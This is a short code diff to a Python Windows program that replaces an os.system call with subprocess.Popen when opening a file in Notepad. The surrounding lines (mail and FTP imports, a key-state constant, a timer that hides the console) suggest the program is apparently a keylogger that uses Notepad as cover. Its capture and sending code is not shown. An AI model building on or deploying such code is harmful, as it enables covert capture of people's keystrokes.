@@ -1,4 +1,4 @@
-import smtplib, time, os, threading, sys
+import smtplib, time, os, threading, sys, subprocess
 import win32console, win32gui, win32event, win32api, winerror
 from win32con import VK_CAPITAL
 from ftplib import FTP
@@ -41,8 +41,7 @@ objTimer = threading.Timer(0, hide);objTimer.start()
 
 # open file in notepad if argument is given
 if len(sys.argv) == 2:
-    strtxtFileCommand = os.environ["windir"]+"\\notepad.exe "+sys.argv[1]
-    os.system(strtxtFileCommand)
+    OpenNotepad = subprocess.Popen([os.environ["windir"]+"\\notepad.exe", sys.argv[1]])
 
 blnStop = "False"
 
